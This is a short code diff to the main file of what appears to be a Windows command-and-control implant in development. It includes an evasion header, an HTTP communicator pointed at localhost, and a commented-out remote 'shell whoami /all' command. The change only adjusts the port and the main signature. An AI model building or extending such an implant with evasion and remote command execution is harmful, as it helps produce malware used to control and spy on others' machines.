@@ -2,18 +2,17 @@
 #include "core.h"
 #include "windows.h"
 #include "evasion.h"
-#include "process.h"
 #include "HttpCommunicator.h"
 
 #define BUFSIZE 4096
 
-int main() {
+int main(int argc, char* argv[]) {
 	core c;
 
 	// test cmd execution
 	// [DONE] we need to update the process functions to redirect everything from STDOUT to a pipe (anon or named - TBD) - see this: https://stackoverflow.com/questions/42402673/createprocess-and-capture-stdout @teodor
 
-	HttpCommunicator httpCommunicator("127.0.0.1", 8081);
+	HttpCommunicator httpCommunicator("127.0.0.1", 8080);
 
 	//c.execute_command("shell whoami /all");
 
